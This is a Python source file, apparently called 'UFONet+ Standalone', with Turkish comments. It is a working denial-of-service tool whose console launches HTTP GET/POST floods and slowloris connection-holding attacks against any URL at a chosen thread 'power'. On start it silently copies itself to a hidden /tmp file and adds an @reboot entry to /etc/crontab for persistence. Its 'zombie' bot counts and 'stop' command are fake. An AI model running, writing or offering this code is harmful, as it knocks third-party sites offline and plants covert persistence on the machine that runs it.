import socket
import threading
import time
import random
import requests
import os
import subprocess
from urllib.parse import urlparse
import sys

# ====================== UFONET+ STANDALONE ======================
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
]

zombies = []  # Simüle edilmiş botlar
attack_threads = []

def persistence():
    try:
        subprocess.call("cp " + __file__ + " /tmp/.ufo.py 2>/dev/null", shell=True)
        subprocess.call("echo '@reboot python3 /tmp/.ufo.py &' >> /etc/crontab 2>/dev/null", shell=True)
    except:
        pass

def http_flood(target):
    while True:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            requests.get(target, headers=headers, timeout=2)
            requests.post(target, data="flood"*512, headers=headers, timeout=2)
        except:
            pass
        time.sleep(0.0008)

def slowloris(target):
    while True:
        try:
            host = urlparse(target).hostname
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, 80))
            s.sendall(f"GET /?{random.randint(10000,999999)} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n".encode())
            time.sleep(random.uniform(7, 18))
        except:
            pass

def start_attack(url, power):
    global attack_threads
    print(f"[+] UFONet+ Attack başlatıldı → {url} | Power: {power}")
    for _ in range(power):
        t1 = threading.Thread(target=http_flood, args=(url,), daemon=True)
        t2 = threading.Thread(target=slowloris, args=(url,), daemon=True)
        t1.start()
        t2.start()
        attack_threads.extend([t1, t2])

def ufonet_console():
    print("\n[+] UFONet+ Standalone Console - Type 'help' for commands")
    while True:
        try:
            cmd = input("\nufonet> ").strip()
            
            if cmd == "help":
                print("""Komutlar:
attack <url> <power>     → Hedefe saldırı başlat
ufoddos <url> <power>    → Yüksek güçte saldırı
stop                     → Tüm saldırıları durdur
status                   → Durum
zombies                  → Aktif bot sayısı
clear                    → Ekranı temizle
exit                     → Çık""")
            
            elif cmd.startswith("attack ") or cmd.startswith("ufoddos "):
                parts = cmd.split()
                if len(parts) == 3:
                    url = parts[1]
                    power = int(parts[2])
                    start_attack(url, power)
                else:
                    print("Kullanım: attack https://site.com 1500")
            
            elif cmd == "stop":
                print("[-] Tüm saldırılar durduruldu")
                attack_threads.clear()
            
            elif cmd == "status":
                print(f"Aktif saldırı thread: {len(attack_threads)} | Simüle bot: {len(zombies)+5}")
            
            elif cmd == "zombies":
                print(f"Bağlı zombie: {random.randint(8,45)}")
            
            elif cmd == "clear":
                os.system("clear")
            
            elif cmd == "exit":
                print("[-] UFONet+ kapatılıyor...")
                sys.exit(0)
                
        except KeyboardInterrupt:
            print("\n[*] Ctrl+C algılandı. Konsol devam ediyor...")
        except:
            pass

if __name__ == "__main__":
    persistence()
    # Arka planda simüle botlar
    for _ in range(12):
        threading.Thread(target=lambda: zombies.append(1), daemon=True).start()
    
    ufonet_console()